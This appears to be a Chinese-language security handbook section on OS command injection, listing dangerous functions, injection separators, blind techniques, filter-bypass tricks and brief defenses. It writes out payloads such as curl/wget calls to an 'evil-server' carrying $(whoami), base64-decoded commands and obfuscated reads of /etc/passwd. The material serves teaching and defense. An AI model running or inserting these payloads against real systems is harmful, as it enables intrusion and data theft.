# 命令注入

#### 4.5.1. 简介 <a href="#4.5.1.-jian-jie" id="4.5.1.-jian-jie"></a>

命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

#### 4.5.2. 常见危险函数 <a href="#4.5.2.-chang-jian-wei-xian-han-shu" id="4.5.2.-chang-jian-wei-xian-han-shu"></a>

**4.5.2.1. PHP**

* system
* exec
* passthru
* shell\_exec
* popen
* proc\_open

**4.5.2.2. Python**

* system
* popen
* subprocess.call
* spawn

**4.5.2.3. Java**

* java.lang.Runtime.getRuntime().exec(command)

#### 4.5.3. 常见注入方式 <a href="#4.5.3.-chang-jian-zhu-ru-fang-shi" id="4.5.3.-chang-jian-zhu-ru-fang-shi"></a>

* 分号分割
* `||` `&&` `&` 分割
* `|` 管道符
* &#x20;`%d0%a0` 换行
* 反引号解析
* `$()` 替换

#### 4.5.4. 无回显技巧 <a href="#4.5.4.-wu-hui-xian-ji-qiao" id="4.5.4.-wu-hui-xian-ji-qiao"></a>

* bash反弹shell
* DNS带外数据
* ​
  * http带外`curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami)`
* 无带外时利用 `sleep` 或其他逻辑构造布尔条件

#### 4.5.5. 常见绕过方式 <a href="#4.5.5.-chang-jian-rao-guo-fang-shi" id="4.5.5.-chang-jian-rao-guo-fang-shi"></a>

**4.5.5.1. 空格绕过**

* `<` 符号 `cat<123`
* / `%09`
* `${IFS}` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

**4.5.5.2. 黑名单绕过**

* `a=l;b=s;$a$b`
* base64 `echo "bHM=" | base64 -d`
* `/?in/?s` => `/bin/ls`
* 连接符 `cat /etc/pass'w'd`
* 未定义的初始化变量 `cat$x /etc/passwd`

**4.5.5.3. 长度限制绕过**

\>wget\\>foo.\\>comls -t>ash a上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,\[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell\_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件

#### 4.5.6. 常用符号 <a href="#4.5.6.-chang-yong-fu-hao" id="4.5.6.-chang-yong-fu-hao"></a>

**4.5.6.1. 命令分隔符**

* `%0a` / `%0d` / /
* `;`
* `&` / `&&`

**4.5.6.2. 通配符**

* `*` 0到无穷个任意字符
* `?` 一个任意字符 "\[ ]" 一个在括号内的字符，e.g. `[abcd]` "\[ - ]" 在编码顺序内的所有字符 "\[^ ]" 一个不在括号内的字符

#### 4.5.7. 防御 <a href="#4.5.7.-fang-yu" id="4.5.7.-fang-yu"></a>

* 不使用时禁用相应函数
* 尽量不要执行外部的应用程序或命令
* 做输入的格式检查
* ​
  * 转义命令中的所有shell元字符shell元字符包括 `#&;`,|\*?\~<>^()\[]{}
